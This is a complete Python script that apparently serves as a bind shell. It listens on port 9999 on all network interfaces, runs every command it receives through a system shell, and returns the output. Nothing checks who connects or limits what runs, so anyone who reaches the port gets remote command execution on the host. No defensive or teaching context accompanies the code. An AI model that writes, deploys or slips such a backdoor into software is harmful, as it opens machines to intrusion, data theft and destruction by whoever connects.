import socket
import subprocess

def handle_client_connection(client_socket):
    while True:
        # Receive the command from the client
        command = client_socket.recv(1024).decode('utf-8')
        if not command:
            break
        
        # Execute the command and get the output
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        
        # Send the command output back to the client
        client_socket.sendall(stdout + stderr)
    
    client_socket.close()

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9999))  # Bind to all interfaces on port 9999
    server_socket.listen(5)
    print("Server listening on port 9999")
    
    while True:
        client_socket, addr = server_socket.accept()
        print(f"Accepted connection from {addr}")
        handle_client_connection(client_socket)

if __name__ == "__main__":
    main()
